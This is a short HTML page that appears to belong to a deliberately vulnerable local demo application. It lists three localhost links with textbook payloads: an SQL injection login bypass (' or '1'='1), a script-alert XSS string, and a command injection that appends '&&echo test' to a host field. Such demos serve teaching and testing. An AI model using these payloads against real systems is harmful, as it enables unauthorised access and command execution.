<h3>Sql injection </h3>
<a href="http://localhost:8080/sqlInjection?username=' or '1'='1&password=' or '1'='1">
    http://localhost:8080/sqlInjection?username=' or '1'='1&password=' or '1'='1</a>

<h3>XSS</h3>
<a href="http://localhost:8080/xss?postComment=%3Cscript%3Ealert(%27hello%27);%3C/script%3E">http://localhost:8080/xss?postComment=%3Cscript%3Ealert(%27hello%27);%3C/script%3E</a>

<h3>Command injection </h3>
<a href="http://localhost:8080/commandInjection?host=www.google.com%26%26echo%20test">http://localhost:8080/commandInjection?host=www.google.com%26%26echo%20test</a>